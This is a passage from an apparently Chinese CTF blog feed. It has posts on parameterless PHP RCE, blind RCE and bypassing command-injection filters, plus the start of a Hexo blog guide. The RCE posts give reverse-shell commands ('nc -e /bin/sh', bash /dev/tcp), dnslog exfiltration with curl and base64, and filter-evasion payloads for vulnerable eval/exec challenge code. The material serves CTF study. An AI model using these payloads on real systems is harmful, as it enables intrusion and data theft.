class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出它是一个有过滤的无参rce，由于它过滤掉了<code>et</code>，导致我们前两种的方法都用不了，而且它也过滤了<code>hex bin</code>，第三种方法也不能像我们上面讲的一样先16进制编码了，而且我抓包以后都看不到<code>PHPSESSID</code>的参数，估计第三种方法也用不了，但有了前面的铺垫，用第四种方法就可以很简单的解决了，首先遍历当前目录：</p><p><img src="https://i.loli.net/2021/07/26/KXMbW8facpPmti4.png" alt="image.png"></p><p>可以看到<code>flag.php</code>是倒数第二个，那我们就把它反转一下，然后再用一个<code>next()</code>就是<code>flag.php</code>这个文件了：</p><p><img src="https://i.loli.net/2021/07/26/Fw3WnoTyICteOpq.png" alt="image.png"></p><p>胜利就在眼前，直接<code>highlight_file</code>读取这个文件就拿到flag了：</p><p><img src="https://i.loli.net/2021/07/26/nqZR5luCJ3TLdvx.png" alt="image.png"></p><p>思路总结:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即<span class="keyword">Array</span>([<span class="number">0</span>]=&gt;index.php[<span class="number">1</span>]=&gt;flag.php=&gt;[<span class="number">2</span>].git[<span class="number">3</span>]=&gt;..[<span class="number">4</span>]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.huaweicloud.com/zhishi/arc-13511436.html">https://www.huaweicloud.com/zhishi/arc-13511436.html</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="https://r1dd1er.top/2019/09/14/bytectf-%E6%97%A0%E5%8F%82RCE/">https://r1dd1er.top/2019/09/14/bytectf-%E6%97%A0%E5%8F%82RCE/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无参数rce&quot;&gt;&lt;a href=&quot;#无参数rce&quot; class=&quot;headerlink&quot; title=&quot;无参数rce&quot;&gt;&lt;/a&gt;无参数rce&lt;/h1&gt;&lt;p&gt;无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之无回显rce</title>
    <link href="https://arsenetang.github.io/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/"/>
    <id>https://arsenetang.github.io/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/</id>
    <published>2021-07-22T16:00:00.000Z</published>
    <updated>2021-08-09T14:14:00.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p>在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行，借着这次总结rce的机会，就把它一起总结了</p><span id="more"></span><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">exec(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适，想了解这个函数可以看这里：<a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a> 这里我们直接输入命令是没有回显的：</p><p><img src="https://i.loli.net/2021/07/23/lywFrtQzh96d8Do.png" alt="image.png"></p><p>我们首先用sleep命令看看命令是否被成功执行了，看下图它转了五秒之后才恢复说明命令是执行了的：</p><p><img src="https://i.loli.net/2021/07/21/1E8dgHADGU67kRZ.png" alt="image.png"></p><h2 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h2><p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p><p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，但这里我不知道哪里出了问题，在docker中可以成功反弹但放到php命令执行中就反弹不了了，所以说无奈之下我就只能使用<code>nc</code>进行反弹，但其实这是很不实用的，因为很多docker中都没有安装<code>nc</code>，这里就先演示一下用<code>nc</code>反弹，利用<code>nc -e /bin/sh ip port</code>进行反弹：</p><p><img src="https://i.loli.net/2021/07/21/5LQVt3C6miKvlRr.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/21/SEyoscMfnzgheBr.png" alt="image.png"></p><p>可以看到已经反弹成功了，拿到了根目录下的flag哈哈</p><h2 id="2-dnslog外带数据法"><a href="#2-dnslog外带数据法" class="headerlink" title="2.dnslog外带数据法"></a>2.dnslog外带数据法</h2><p>首先讲讲dns，这里用一个比较官方的解释吧，摘自百度百科：</p><p>DNS（域名解析）：</p><p>域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p><p>域名解析也叫域名指向、服务器设置、域名配置以及反向IP登记等等。说得简单点就是将好记的域名解析成IP，服务由DNS服务器完成，是把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p><p>而如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令哈</p><p>然后这里推荐一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a>，我个人觉得挺好用的，当然大佬们也可以选择自己搭，注册账号之后，会给一个域名，当发起的请求中含有这个域名时，平台就会有记录。好了，铺垫结束，下面正式开始测试：</p><p><img src="https://i.loli.net/2021/07/23/cZLKtFx7ONgzRE3.png" alt="image.png"></p><p>还是这一段代码，我们用分号<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令，具体如下：</p><p><img src="https://i.loli.net/2021/07/23/wtxKpbeEDFrlA8i.png" alt="image.png"></p><p>然后就可以到ceye平台上取看到我们发起的请求了，可以看到<code>whoami</code>的结果也已经在上面显示了出来：</p><p><img src="https://i.loli.net/2021/07/23/Slg8T1GwBNLEodI.png" alt="image.png"></p><p>然后我们就尝试执行其它的命令比如像<code>ls</code>之类的，但这里需要注意的一点是，如果我们直接执行<code>ls</code>的话，它只会返回第一条结果,具体如下图所示：</p><p><img src="https://i.loli.net/2021/07/23/Wj2KMsni3t7NZTf.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/Bs7ac6tLJ2MAQPW.png" alt="image.png"></p><p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分，这里利用题目不是很好演示，我就直接用kali进行演示，就像下图一样直接用就行，还是很方便的：</p><p><img src="https://i.loli.net/2021/07/23/uEemFwbCSNnMWIt.png" alt="image.png"></p><p>这样就可以完成任意的命令执行了，但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p><p><img src="https://i.loli.net/2021/07/23/MLnz7wrlu8GYcDN.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/hRgX1KBHMy4IVN8.png" alt="image.png"></p><h2 id="例题解析——-BJDCTF-2nd-duangShell"><a href="#例题解析——-BJDCTF-2nd-duangShell" class="headerlink" title="例题解析——-BJDCTF 2nd  duangShell"></a>例题解析——-BJDCTF 2nd  duangShell</h2><p>这道题buuctf上可以复现，先用kali恢复swp文件，然后得到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl = $_POST[&#x27;girl_friend&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/\&gt;|\\\/&#x27;, $girl)) &#123;</span><br><span class="line">        die(&#x27;just girl&#x27;);</span><br><span class="line">    &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这就是一个有过滤情况下的无回显rce，虽然是看起来过滤的比较多，基本思路是反弹shell，但这个靶机在内网操作起来可能有点麻烦，而且像一些重要的比如<code>curl</code> <code>反引号</code>都没有被过滤掉，所以说我想尝试直接把数据外带出来，先尝试<code>whoami</code>发现没问题：</p><p><img src="https://i.loli.net/2021/07/23/7ZbL8wf4FWyBxiO.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/OiImJHZfDtXvb36.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/pzi3xtIkQTHaKWO.png" alt="image.png"></p><p>那就说明除了上面那些被禁的函数以外，可以执行任何命令，不过禁了ls是真的烦，然后由于它禁了<code>$</code>，上篇文章中讲到的找flag的语句<code>cat $(find / -name flag*)</code>就用不了了，我先盲猜一下它在根目录下名字叫flag，试试行不行，<code>cat</code>被过滤掉了我就直接用<code>tac</code>，这个问题不大，发现还真有这个文件：</p><p><img src="https://i.loli.net/2021/07/23/fnYz1eG9ruybBgH.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/SXUqyKCbiTQ3BYc.png" alt="image.png"></p><p>只不过嘛，这个内容就很狗，还要让自己去找flag，那我就试试用<code>find</code>去找，说实话这时候我心里也没底，只能说试试，用的这条语句<code> find / -name flag</code>：</p><p><img src="https://i.loli.net/2021/07/23/b3QMaRul85r1ckZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/MdWxceDCu3LykXP.png" alt="image.png"></p><p>不过运气是真的好哈哈哈，直接出来了路径，那就稳了啊，直接读它就完事儿了：</p><p><img src="https://i.loli.net/2021/07/23/7VhzlXgKQsyeaOm.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/fewhUp82PEVvgFS.png" alt="image.png"></p><p>出来了出来了，加上<code>&#123;&#125;</code>就是最终的flag，不过我看wp的时候方法都是用反弹shell做的，不知道我这种算不算非预期解，想了解那种方法的可以自行百度，这里也推荐两篇文章：</p><p><a href="https://www.extrader.top/posts/c714e372/">https://www.extrader.top/posts/c714e372/</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105351352">https://blog.csdn.net/qq_45521281/article/details/105351352</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无回显rce&quot;&gt;&lt;a href=&quot;#无回显rce&quot; class=&quot;headerlink&quot; title=&quot;无回显rce&quot;&gt;&lt;/a&gt;无回显rce&lt;/h1&gt;&lt;p&gt;在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行，借着这次总结rce的机会，就把它一起总结了&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之命令执行中的各种绕过</title>
    <link href="https://arsenetang.github.io/2021/07/20/RCE%E7%AF%87%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/"/>
    <id>https://arsenetang.github.io/2021/07/20/RCE%E7%AF%87%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/</id>
    <published>2021-07-19T16:00:00.000Z</published>
    <updated>2021-08-09T14:13:33.896Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行中的各种绕过"><a href="#命令执行中的各种绕过" class="headerlink" title="命令执行中的各种绕过"></a>命令执行中的各种绕过</h1><p>在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤</p><span id="more"></span><h2 id="1-绕过空格"><a href="#1-绕过空格" class="headerlink" title="1.绕过空格"></a>1.绕过空格</h2><p>常见的绕过空格的方法有<code>$IFS$9</code>,<code>$IFS</code>,<code>$IFS$1</code>,<code>$&#123;IFS&#125;</code>,<code>%09</code>,$IFS是linux下的分隔符，加上{}或者后面加$表示截断，防止与后面的变量名粘连导致命令无法执行，而<code>$9</code>指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此<code>$9</code>相当于没有加东西，等于做了一个前后隔离，基本上用上面的方法都可以绕过空格了，还有一些不常用的方法，比如说用<code>cat&lt;a.txt</code>表示<code>cat a.txt</code>，<code>&#123;cat,flag.php&#125;</code>等等</p><h2 id="2-绕过分隔符"><a href="#2-绕过分隔符" class="headerlink" title="2.绕过分隔符"></a>2.绕过分隔符</h2><p>linux下执行两条不同的命令中间需要分隔符，分隔符一般都是用<code>||</code>或者<code>;</code> 这两个一般都会有一个不会被禁掉，直接用就行，<code>;</code>只起分隔作用，不关心彼此是否执行成功，所有命令都会执行，而<code>||</code>实现逻辑或的功能，只有在左边的命令执行失败时，右边的命令才会执行</p><h2 id="3-绕过关键字"><a href="#3-绕过关键字" class="headerlink" title="3.绕过关键字"></a>3.绕过关键字</h2><p>这个应该是最重要的了，每次过滤的重点就是关键字，一般绕过的方法如下：</p><h3 id="1-中间加入符号"><a href="#1-中间加入符号" class="headerlink" title="1.中间加入符号"></a>1.中间加入符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种我认为是最常见也是最简单的，你可以在命令中添加反斜杠\或者双引号&quot;或者反引号`来绕过正则匹配</span><br><span class="line">但要记住的是，两个字母之间反斜杠\只能加一个，双引号&quot;和反引号`因为要闭合所以只能加偶数个，否则就不能执行命令了：</span><br><span class="line">ls -&gt; l\s</span><br><span class="line">ls -&gt; l&quot;&quot;s</span><br><span class="line">ls -&gt; l``s</span><br><span class="line">cat /flag -&gt; ca\t /flag -&gt; c\a\t /flag</span><br><span class="line">cat /flag -&gt; ca&quot;&quot;t /flag -&gt; c&quot;&quot;a&quot;&quot;t /flag</span><br><span class="line">cat /flag -&gt; ca``t /flag -&gt; c``a``t /flag</span><br></pre></td></tr></table></figure><h3 id="2-拆分命令绕过"><a href="#2-拆分命令绕过" class="headerlink" title="2.拆分命令绕过"></a>2.拆分命令绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种方法还是非常常见的，就是通过拆分和拼接的方式，可以绕过对命令和对文件名的正则匹配，达到执行命令的目的</span><br><span class="line">但这种方式有很大的弊端就是当分号被过滤掉之后就很难使用了：</span><br><span class="line">ls -&gt; a=l;b=s;$a$b</span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b$a;</span><br></pre></td></tr></table></figure><h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种方法网上写的非常多，但我觉得实际能用的情况其实挺少的，而且构造它也相对比较麻烦，这里就简单推荐两种方法：</span><br><span class="line">1.base64</span><br><span class="line">echo &#x27;cat&#x27; | base64  --&gt; Y2F0Cg==</span><br><span class="line">那我们就可以构造cat /flag为：</span><br><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d` /flag</span><br><span class="line">2.hex</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash </span><br><span class="line">其中77686F616D69是whoami的hex编码</span><br></pre></td></tr></table></figure><h3 id="4-通配符绕过"><a href="#4-通配符绕过" class="headerlink" title="4.通配符绕过"></a>4.通配符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这种方式主要是针对文件名那几个字符被过滤时可以使用，就是用?或者*来代替具体的字符</span><br><span class="line">但一定注意这是针对文件名的哈，命令是肯定不能直接这么用的，但linux下命令其实也是文件</span><br><span class="line">比如说像cat就对应文件/bin/cat，ls就对应文件/bin/ls等等，我们也可以用类似的方法进行构造：</span><br><span class="line">ls -&gt; /bin/l?</span><br><span class="line">cat -&gt; /bin/c??</span><br><span class="line">像preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)这种flag字样都是被过滤了的，我们用通配符就很好用：</span><br><span class="line">cat /flag -&gt; /bin/ca? /????</span><br></pre></td></tr></table></figure><h2 id="4-例题解析—–BMZCTF-端午就该吃粽子"><a href="#4-例题解析—–BMZCTF-端午就该吃粽子" class="headerlink" title="4.例题解析—–BMZCTF 端午就该吃粽子"></a>4.例题解析—–BMZCTF 端午就该吃粽子</h2><p>前面的过程就不讲了，核心源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|&#x27;| |&gt;|]|&amp;| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\*)/i&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no no no!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no flag!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心语句是<code>shell_exec(&quot;ping -c 4 &quot;.$ip);</code>相当于就是一个有过滤情况下的命令执行，那按照前面讲的方法绕过的方法就很多了，很多种方法都可以拿到flag，我们先<code>ls</code>一下根目录，空格就用<code>%09</code>代替：</p><p><img src="https://i.loli.net/2021/07/20/Su8FlUMJ35Hx6k2.png" alt="image.png"></p><p>可以看到flag就在根目录下，那我们看它的方法就很多了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1||c&quot;&quot;at%09/????</span><br><span class="line">1||c\a\t$IFS$9/????</span><br><span class="line">1||/bin/c??$IFS/????</span><br><span class="line">1||c&quot;&quot;at%09$(find%09/%09-name%09f??g)</span><br><span class="line">等等等等非常多种，可以随意组合实现cat /flag这条命令,然后就得到flag了</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/20/cMWse5nqX7BR8CA.png" alt="image.png"></p><p>顺便这里再多讲一个，有的ctf题恶心人，他不把flag放根目录下，找它就很费功夫，就可以用下列语句找flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;find / -name flag*&quot;)：查找所有文件名匹配flag*的文件</span><br><span class="line">system(&quot;cat $(find / -name flag*)&quot;)：打印所有文件名匹配flag*的文件</span><br><span class="line">一般直接用第二条就可以打印出flag文件了,当然如果是有过滤的话就按照上面的方法绕过就好啦！</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;命令执行中的各种绕过&quot;&gt;&lt;a href=&quot;#命令执行中的各种绕过&quot; class=&quot;headerlink&quot; title=&quot;命令执行中的各种绕过&quot;&gt;&lt;/a&gt;命令执行中的各种绕过&lt;/h1&gt;&lt;p&gt;在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="https://arsenetang.github.io/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://arsenetang.github.io/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2021-07-09T16:00:00.000Z</published>
    <updated>2021-08-09T14:21:36.482Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客的过程及注意事项"><a href="#hexo-github搭建个人博客的过程及注意事项" class="headerlink" title="hexo+github搭建个人博客的过程及注意事项"></a>hexo+github搭建个人博客的过程及注意事项</h1><p>前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑</p><span id="more"></span><h2 id="第一步：工具安装"><a href="#第一步：工具安装" class="headerlink" title="第一步：工具安装"></a>第一步：工具安装</h2><p>首先是工具的安装，我们先安装GitBash，进入git官网：<a href="https://git-scm.com/">https://git-scm.com/</a>，直接点击download选择相应版本下载即可；</p><p>然后安装node.js，直接进入node官网：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>下载即可，安装时一定要勾选全部组件，以及<code>add to path</code>，让它给你自动配置环境变量，这样安装node.js时就已经完成了npm的安装以及环境变量的配置。完成后在cmd和Git Bash下都输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v # 会显示node版本号，说明安装成功</span><br><span class="line">npm -v # 会显示npm版本号，说明安装成功</span><br></pre></td></tr></table></figure><p>如果它显示<code>command not found</code>，可能就是环境变量配置有问题，记得用户变量也需要配置，把npm的用户变量配上就行</p><p><img src="https://i.loli.net/2021/07/10/XsaKNBVELxtguDZ.png" alt="image.png"></p><h2 id="第二步：GitHub注册"><a href="#第二步：GitHub注册" class="headerlink" title="第二步：GitHub注册"></a>第二步：GitHub注册</h2><p>然后进入到github官网：<a href="https://github.com/">https://github.com/</a>，注册一个自己的账号，邮箱和用户名要选择常用的哈，方便记住，然后在Git Bash上设置一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 